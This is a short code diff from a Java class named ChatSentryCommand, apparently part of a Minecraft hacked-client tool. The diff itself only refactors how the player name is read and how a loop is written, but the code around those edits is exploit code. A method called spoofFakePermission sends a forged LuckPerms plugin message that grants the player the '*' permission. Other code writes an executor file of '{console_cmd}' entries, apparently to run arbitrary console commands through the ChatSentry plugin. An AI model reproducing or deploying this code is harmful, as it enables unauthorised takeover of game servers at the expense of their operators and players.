@@ -92,7 +92,7 @@ public class ChatSentryCommand extends Command {
     private void spoofFakePermission() {
         Helper.sendPluginMessage("luckperms:main", out -> {
             out.writeUTF("user");
-            out.writeUTF(Helper.getPlayerName());
+            out.writeUTF(getMinecraftClient().getSession().getUsername());
             out.writeUTF("permission");
             out.writeUTF("set");
             out.writeUTF("*");
@@ -160,8 +160,8 @@ public class ChatSentryCommand extends Command {
         out.writeUTF(EXECUTOR_FILE);
 
         StringBuilder exec = new StringBuilder();
-        for (int i = 0; i < commands.length; i++) {
-            exec.append("  - \"{console_cmd}: ").append(commands[i]).append("\"\n");
+        for (String cmd : commands) {
+            exec.append("  - \"{console_cmd}: ").append(cmd).append("\"\n");
         }
         exec.append("  - \"{player_msg}: &aExecution Complete!\"");
 
